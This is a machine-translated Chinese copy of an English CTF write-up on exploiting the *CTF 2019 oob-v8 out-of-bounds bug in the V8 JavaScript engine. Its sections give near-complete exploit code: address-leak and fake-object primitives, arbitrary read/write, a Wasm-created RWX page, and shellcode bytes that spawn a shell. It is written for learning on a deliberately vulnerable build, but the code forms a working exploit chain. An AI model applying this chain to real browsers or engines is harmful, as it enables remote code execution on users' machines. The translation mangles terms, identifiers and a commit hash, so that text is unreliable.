<html>
<head>
<title>Novel Points: Exploit the Heap Overflow Bug *CTF 2019 oob-v8</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">小说要点:利用堆溢出Bug *CTF 2019 oob-v8</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/novel-points-exploit-the-heap-overflow-bug-ctf-2019-oob-v8-97530977e5bd?source=collection_archive---------3-----------------------#2020-12-22">https://infosecwriteups.com/novel-points-exploit-the-heap-overflow-bug-ctf-2019-oob-v8-97530977e5bd?source=collection_archive---------3-----------------------#2020-12-22</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/d1ce15a88229eed9f335c527ad99f26d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G0K7GK_fF3DMl2AYw0XNsw.jpeg"/></div></div></figure><h1 id="3d34" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">1.内容</h1><ul class=""><li id="facd" class="kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln bi translated">许多堆溢出漏洞可以用类似的方式被利用</li><li id="0914" class="kw kx iq ky b kz lp lb lq ld lr lf ls lh lt lj lk ll lm ln bi translated"><a class="ae lo" href="https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#poc" rel="noopener ugc nofollow" target="_blank">V8堆溢出漏洞的PoC——* CTF 2019 oo b-V8</a></li><li id="da37" class="kw kx iq ky b kz lp lb lq ld lr lf ls lh lt lj lk ll lm ln bi translated"><a class="ae lo" href="https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#exploitation-idea" rel="noopener ugc nofollow" target="_blank">剥削理念</a></li><li id="25a1" class="kw kx iq ky b kz lp lb lq ld lr lf ls lh lt lj lk ll lm ln bi translated"><a class="ae lo" href="https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#actual-exploitation-steps" rel="noopener ugc nofollow" target="_blank">V8堆溢出漏洞的实际利用步骤</a></li><li id="e6e8" class="kw kx iq ky b kz lp lb lq ld lr lf ls lh lt lj lk ll lm ln bi translated"><a class="ae lo" href="https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#environment" rel="noopener ugc nofollow" target="_blank"> V8环境设置</a></li><li id="8596" class="kw kx iq ky b kz lp lb lq ld lr lf ls lh lt lj lk ll lm ln bi translated"><a class="ae lo" href="https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#type-conversion-functions" rel="noopener ugc nofollow" target="_blank">辅助类型转换功能</a></li><li id="7a64" class="kw kx iq ky b kz lp lb lq ld lr lf ls lh lt lj lk ll lm ln bi translated"><a class="ae lo" href="https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#prepare-objects" rel="noopener ugc nofollow" target="_blank">在内存中准备对象</a></li><li id="be7f" class="kw kx iq ky b kz lp lb lq ld lr lf ls lh lt lj lk ll lm ln bi translated"><a class="ae lo" href="https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#leak-addresses-fake-objects" rel="noopener ugc nofollow" target="_blank">泄露地址和伪造对象</a></li><li id="bc76" class="kw kx iq ky b kz lp lb lq ld lr lf ls lh lt lj lk ll lm ln bi translated"><a class="ae lo" href="https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#arbitrary-reads-writes" rel="noopener ugc nofollow" target="_blank">任意读写</a></li><li id="0dbd" class="kw kx iq ky b kz lp lb lq ld lr lf ls lh lt lj lk ll lm ln bi translated"><a class="ae lo" href="https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#shellcode-injection" rel="noopener ugc nofollow" target="_blank"> RWX页面和外壳代码注入</a></li><li id="87dd" class="kw kx iq ky b kz lp lb lq ld lr lf ls lh lt lj lk ll lm ln bi translated"><a class="ae lo" href="https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/#summary" rel="noopener ugc nofollow" target="_blank">总结</a></li></ul><h1 id="7fad" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">2.许多堆溢出漏洞可以以类似的方式被利用</h1><p id="f0d5" class="pw-post-body-paragraph lu lv iq ky b kz la lw lx lb lc ly lz ld ma mb mc lf md me mf lh mg mh mi lj ij bi">I have introduced a v8 heap overflow bug before: <a class="ae lo" href="https://pwnbykenny.com/2020/08/01/v8-array-overflow-exploitation-2019-kctf-problem-5-%e5%b0%8f%e8%99%8e%e8%bf%98%e4%b9%a1/" rel="noopener ugc nofollow" target="_blank">V8 Array Overflow Exploitation: 2019 KCTF Problem 5 小虎还乡 — Pwn By Kenny</a>. This is another one: *CTF 2019 oob-v8. The interesting things I’m going to show you in this post are: 1) This bug only allows you to read or overwrite specific 8 bytes. But you can use it to achieve arbitrary reads and writes. 2) This is a different heap overflow bug. But you can exploit it in a very similar way to the 2019 KCTF Problem 5. In fact, many heap overflow bugs can all be exploited in such a similar way. To show you this, I will use the same headings as the 2019 KCTF Problem 5 post. Feel free to compare the two posts!</p><h1 id="da63" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">3.V8堆溢出漏洞的概念验证— *CTF 2019 oob-v8</h1><p id="1884" class="pw-post-body-paragraph lu lv iq ky b kz la lw lx lb lc ly lz ld ma mb mc lf md me mf lh mg mh mi lj ij bi translated">PoC代码是触发bug的原因。对于这个*CTF 2019 oob-v8的bug，我们可以用“JSArray.oob()”进行越界读取，并用“js array . OOB(value)；”写出越界。JSArray是一个v8对象，用来表示一个数组。例如，如果您编写类似“var arr =[1.1]；”的代码，内存中就会有一个JSArray对象。和" arr . OOB()；"允许您读取数组元素区域之外的下8个字节。" arr . OOB(2.2)；"允许您用2.2来覆盖8个字节。关于JSArray的更多信息，请访问<a class="ae lo" href="https://pwnbykenny.com/2020/07/05/v8-objects-and-their-structures/#jsarray-related-objects" rel="noopener ugc nofollow" target="_blank"> V8对象和它们的结构—肯尼的Pwn</a></p><h1 id="c81e" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">4.开发理念</h1><p id="ca85" class="pw-post-body-paragraph lu lv iq ky b kz la lw lx lb lc ly lz ld ma mb mc lf md me mf lh mg mh mi lj ij bi translated">这里有一个关于我们将如何利用v8堆溢出漏洞*CTF 2019 oob-v8的总结。</p><ul class=""><li id="d3e0" class="kw kx iq ky b kz mj lb mk ld ml lf mm lh mn lj lk ll lm ln bi translated">首先，我们定义两个变量“var obj _ arr =[{ " a ":1 }]；”和“var double _ arr =[1.1]；”。第一个是对象数组。它存储对象的地址。第二个是双数组。它存储双精度值。{“a”:1 }和1.1不重要。它们只是用来创建特定类型的数组——对象数组和双数组。所以这两个值是可以改变的。</li><li id="181d" class="kw kx iq ky b kz lp lb lq ld lr lf ls lh lt lj lk ll lm ln bi translated">其次，我们实现两个函数:GetAddrOf(对象)，FakeObjFrom(地址)。GetAddrOf返回对象的地址。FakeObjFrom从一个地址返回一个对象。这两个函数的实现依赖于改变obj_arr和double_arr的类型字段。</li><li id="4d6a" class="kw kx iq ky b kz lp lb lq ld lr lf ls lh lt lj lk ll lm ln bi translated">第三，我们用上面两个函数实现另外两个函数:Read64(地址)，Write64(地址，值)。Read64从地址中读取一个8字节的值。Write64将一个8字节的值写入一个地址。它们的实现依赖于一个伪双精度数组— fake_double_arr。通过修改数组的“指向元素的指针”字段，我们能够读取和写入任意地址。</li><li id="f510" class="kw kx iq ky b kz lp lb lq ld lr lf ls lh lt lj lk ll lm ln bi translated">第四，我们使用wasm代码创建一个函数— f. V8将代码放入一个RWX页面。然后，我们泄漏页面中的一个地址，并向该地址注入外壳代码。</li><li id="48c0" class="kw kx iq ky b kz lp lb lq ld lr lf ls lh lt lj lk ll lm ln bi translated">最后，我们通过调用函数来执行shell代码:f()；。这是因为外壳代码覆盖了f的原始代码，外壳代码将产生一个外壳。</li></ul><h1 id="74bd" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">5.V8堆溢出漏洞的实际利用步骤</h1><p id="3d7b" class="pw-post-body-paragraph lu lv iq ky b kz la lw lx lb lc ly lz ld ma mb mc lf md me mf lh mg mh mi lj ij bi translated">以下开发步骤大量使用了关于v8对象结构的知识。请先阅读这个帖子来熟悉它们:<a class="ae lo" href="https://pwnbykenny.com/2020/07/05/v8-objects-and-their-structures/" rel="noopener ugc nofollow" target="_blank"> V8对象及其结构——肯尼的Pwn</a></p><h1 id="c92a" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">5.1 V8环境设置</h1><p id="291b" class="pw-post-body-paragraph lu lv iq ky b kz la lw lx lb lc ly lz ld ma mb mc lf md me mf lh mg mh mi lj ij bi translated">首先从<a class="ae lo" href="https://drive.google.com/file/d/1N8ZRtovEmhUCzyVSPYukEl6wgfj2kzWC/view?usp=sharing" rel="noopener ugc nofollow" target="_blank">这里</a>下载oob.diff。二、阅读本节，构建易受攻击的v8: <a class="ae lo" href="https://pwnbykenny.com/2020/06/30/v8-architectures-and-build-v8/#installation" rel="noopener ugc nofollow" target="_blank"> V8架构&amp;肯尼</a>构建V8 — Pwn其中，在命令5处，[commit-hash-number]为6 DC 88 c 191 f 5 ECC 5389 DC 26 EFA 3c a 0907 faef 3598。在命令8之前，运行:git apply &lt; oob.diff，记得把oob.diff放到文件夹“v8”里。</p><h1 id="e61e" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">5.2辅助类型转换功能</h1><p id="7cc5" class="pw-post-body-paragraph lu lv iq ky b kz la lw lx lb lc ly lz ld ma mb mc lf md me mf lh mg mh mi lj ij bi">They are exactly the same as 2019 KCTF Problem 5: <a class="ae lo" href="https://pwnbykenny.com/2020/08/01/v8-array-overflow-exploitation-2019-kctf-problem-5-%e5%b0%8f%e8%99%8e%e8%bf%98%e4%b9%a1/#auxiliary-type-conversion-functions" rel="noopener ugc nofollow" target="_blank">V8 Array Overflow Exploitation: 2019 KCTF Problem 5 小虎还乡 — Pwn By Kenny</a></p><h1 id="cf66" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">5.3在内存中准备对象</h1><p id="1189" class="pw-post-body-paragraph lu lv iq ky b kz la lw lx lb lc ly lz ld ma mb mc lf md me mf lh mg mh mi lj ij bi translated">这对应于开发理念部分的第一步。我们需要一个对象数组和一个双数组。第二步我们还需要他们的类型字段的值。</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="9e27" class="mx jz iq mt b gy my mz l na nb">var obj = {"a":1};<br/>/* Define an object array. */<br/>var obj_arr = [obj];<br/>/* Define a double array. */<br/>var double_arr = [1.1];<br/>/* Get the object array's type field. */<br/>var obj_arr_type = obj_arr.oob();<br/>/* Get the double array's type field. */<br/>var double_arr_type = double_arr.oob();</span></pre><p id="8568" class="pw-post-body-paragraph lu lv iq ky b kz mj lw lx lb mk ly lz ld nc mb mc lf nd me mf lh ne mh mi lj ij bi translated">如果你读过关于obejcts结构的帖子。你会知道obj_arr在内存中是这样表示的:</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="7a09" class="mx jz iq mt b gy my mz l na nb">+0x00: (FixedArray Begins) (Element Area Begins)<br/>+0x08: (Length)<br/>+0x10: (Pointer to {"a":1}) (First and also Last Element in the Element Area)<br/>+0x18: (JSArray Begins) (Type of obj_arr)<br/>+0x20: (...)</span></pre><p id="7a69" class="pw-post-body-paragraph lu lv iq ky b kz mj lw lx lb mk ly lz ld nc mb mc lf nd me mf lh ne mh mi lj ij bi translated">obj_arr.oob()读取其元素区域之外的下8个字节。所以它读取偏移量+0x18处的值，这是obj_arr的类型值。这类似于double_arr。</p><h1 id="b31b" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">5.4泄露地址和伪造对象</h1><p id="c20c" class="pw-post-body-paragraph lu lv iq ky b kz la lw lx lb lc ly lz ld ma mb mc lf md me mf lh mg mh mi lj ij bi translated">此部分对应于开发理念部分中的步骤2。</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="5b7c" class="mx jz iq mt b gy my mz l na nb">function GetAddrOf(object) {<br/>    /* Put the object into obj_arr. */<br/>    obj_arr[0] = object;<br/>    /* Overwrite obj_arr's type to double. */<br/>    obj_arr.oob(double_arr_type);<br/>    /* Get the object's address in double format. */<br/>    let addr = obj_arr[0];<br/>    /* Recover the type of obj_arr. */<br/>    obj_arr.oob(obj_arr_type);<br/>    return addr;<br/>}<br/>function FakeObjFrom(address) {<br/>    double_arr[0] = address;<br/>    /* Change the type of double_arr to object array. */<br/>    double_arr.oob(obj_arr_type);<br/>    /* Read the address in object pointer format. */<br/>    let obj = double_arr[0];<br/>    double_arr.oob(double_arr_type);<br/>    return obj;<br/>}</span></pre><p id="a9b8" class="pw-post-body-paragraph lu lv iq ky b kz mj lw lx lb mk ly lz ld nc mb mc lf nd me mf lh ne mh mi lj ij bi translated">这两个函数的关键思想是类型字段控制第一个元素单元格中的内容。如果类型是double，则单元格存储一个double数。如果类型是object，那么单元格存储一个对象指针。如果它是一个对象指针，我们不能得到指针值。我们能得到的是对象本身而不是指针值。这就是为什么我们需要将类型改为double。这类似于FakeObjFrom。</p><h1 id="63f9" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">5.5任意读取和写入</h1><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="ac28" class="mx jz iq mt b gy my mz l na nb">A:var fake_double_arr_container = [<br/>    double_arr_type, // Type Field<br/>    double_arr_type, // Placeholder, Not Important<br/>    double_arr_type, // Element Area Pointer, To Be Changed<br/>    i2f(0x10, 0),    // Element Area's Length<br/>];<br/>B:var container_addr = GetAddrOf(fake_double_arr_container);<br/>C:var fake_double_arr_addr = iadd(container_addr, ?); <br/>D:var fake_double_arr = FakeObjFrom(fake_double_arr_addr);<br/>E:function Read64(address) {<br/>    fake_double_arr_container[2] = iadd(address, -0x10);<br/>    return fake_double_arr[0];<br/>}<br/>F:function Write64(address, value) {<br/>    fake_double_arr_container[2] = iadd(address, -0x10);<br/>    fake_double_arr[0] = value;<br/>}</span></pre><p id="db37" class="pw-post-body-paragraph lu lv iq ky b kz mj lw lx lb mk ly lz ld nc mb mc lf nd me mf lh ne mh mi lj ij bi translated">在A行，我们将一个双精度数组定义为一个容器。该容器包含一个伪双数组——fake _ double _ arr，它是根据双数组的结构构造的。我们能够将fake_double_arr的元素区域指针更改为任何地址。这就是我们实现任意读写的方式。这也是我们不直接定义double数组的原因。直接定义不允许我们改变它的元素区域指针。</p><p id="84fe" class="pw-post-body-paragraph lu lv iq ky b kz mj lw lx lb mk ly lz ld nc mb mc lf nd me mf lh ne mh mi lj ij bi translated">在B行，我们得到了容器的地址。在C行，我们通过向container_addr添加一个偏移量来计算fake_double_arr的地址。你需要用真实的偏移量来代替问号。它可能会在您的机器上发生变化。对我来说，是0x30。可以用v8原生函数查出来:%DebugPrint，%SystemBreak。在D行，我们最终让地址被识别为一个对象指针。所以我们有了我们的假双数组。</p><p id="30a2" class="pw-post-body-paragraph lu lv iq ky b kz mj lw lx lb mk ly lz ld nc mb mc lf nd me mf lh ne mh mi lj ij bi translated">在E行，我们定义了一个Read64函数。首先，我们将它的元素区域指针设置为我们感兴趣的地址。第二，我们读取并返回它的值。元件区域具有结构。0x10是结构的标头大小。Write64类似。</p><h1 id="9afe" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">5.6 RWX页面和外壳代码注入</h1><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="978d" class="mx jz iq mt b gy my mz l na nb">1   var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,<br/>    128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,<br/>    1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,<br/>    128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,<br/>    0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);<br/>2   var wasmModule = new WebAssembly.Module(wasmCode);<br/>3   var wasmInstance = new WebAssembly.Instance(wasmModule, {});<br/>4   var f = wasmInstance.exports.main;<br/>5   var wasm_instance_addr = GetAddrOf(wasmInstance);<br/>6   var rwx_page_addr = Read64(iadd(wasm_instance_addr, ?));<br/>7   var shellcode = [<br/>        i2f(0x2fbb4852, 0x99583b6a),<br/>        i2f(0x5368732f, 0x6e69622f),<br/>        i2f(0x050f5e54, 0x57525f54)<br/>    ];<br/>8   var data_buf = new ArrayBuffer(24);<br/>9   var data_view = new DataView(data_buf);<br/>10  var buf_backing_store_addr = iadd(GetAddrOf(data_buf), 0x20);<br/>11  Write64(buf_backing_store_addr, rwx_page_addr);<br/>12  data_view.setFloat64(0, shellcode[0], true);<br/>13  data_view.setFloat64(8, shellcode[1], true);<br/>14  data_view.setFloat64(16, shellcode[2], true);<br/>15  f();</span></pre><p id="e509" class="pw-post-body-paragraph lu lv iq ky b kz mj lw lx lb mk ly lz ld nc mb mc lf nd me mf lh ne mh mi lj ij bi translated">最后，我们到了外壳代码注入部分。我们想注入一个RWX页面。所以我们需要先创建这样一个页面。幸运的是，Wasm代码就存储在这样的页面上。第1行到第4行使用Wasm代码来定义函数f。第5行和第6行跟踪wasmInstance的结构并检索Wasm代码的地址。该地址距wasmInstance对象的开头有一定的偏移量。在您的机器上，偏移量可能会改变。记住用真实的偏移量替换问号。可以用v8原生函数查出来:%DebugPrint，%SystemBreak。对我来说，偏移量是0x88。</p><p id="c34f" class="pw-post-body-paragraph lu lv iq ky b kz mj lw lx lb mk ly lz ld nc mb mc lf nd me mf lh ne mh mi lj ij bi translated">第7行定义了外壳代码。我写了一篇关于外壳代码的文章。有关shellcode的更多信息，请在主页上搜索它。第8、10、11行覆盖了data_buf的后备存储指针。后备存储是ArrayBuffer对象存储其值的缓冲区。0x20是ArrayBuffer对象结构内后备存储指针的偏移量。第10行用RWX页面的地址替换后备存储器指针。第9、12、13、14行将外壳代码写入后备存储器，即RWX页，Wasm代码存储的地址。现在函数f的代码被覆盖为外壳代码。所以我们能够通过调用f()来执行外壳代码；。</p><h1 id="d85d" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">6.摘要</h1><p id="f4e7" class="pw-post-body-paragraph lu lv iq ky b kz la lw lx lb lc ly lz ld ma mb mc lf md me mf lh mg mh mi lj ij bi translated">这篇文章描述了利用一个一个的错误*CTF 2019 oob-v8，只给你这么有限的能力。但是有趣的一点是，你可以通过bug实现更强大的原语。此外，我还想向您展示，许多堆溢出错误都可以通过类似的方式被利用。如果你对比一下这个帖子和“2019 KCTF问题5”的帖子，你会发现他们的剥削过程是相似的。</p><p id="1c4c" class="pw-post-body-paragraph lu lv iq ky b kz mj lw lx lb mk ly lz ld nc mb mc lf nd me mf lh ne mh mi lj ij bi translated">如果您连接第5部分中的代码片段，您将有一个工作漏洞。但是，请用它们的实际价值替换这两个问号。做一些实验/练习！</p><p id="2f2e" class="pw-post-body-paragraph lu lv iq ky b kz mj lw lx lb mk ly lz ld nc mb mc lf nd me mf lh ne mh mi lj ij bi translated">如果你喜欢我的帖子或者觉得有帮助，请帮我分享到你的社交媒体上~谢谢！</p><p id="3d2f" class="pw-post-body-paragraph lu lv iq ky b kz mj lw lx lb mk ly lz ld nc mb mc lf nd me mf lh ne mh mi lj ij bi translated">(本帖来自<a class="ae lo" href="https://pwnbykenny.com/2020/12/21/novel-point-exploit-heap-overflow-ctf-2019-oob-v8/" rel="noopener ugc nofollow" target="_blank">小说要点:利用堆溢出Bug *CTF 2019 oob-v8 — Pwn作者肯尼</a>)</p></div></div>    
</body>
</html>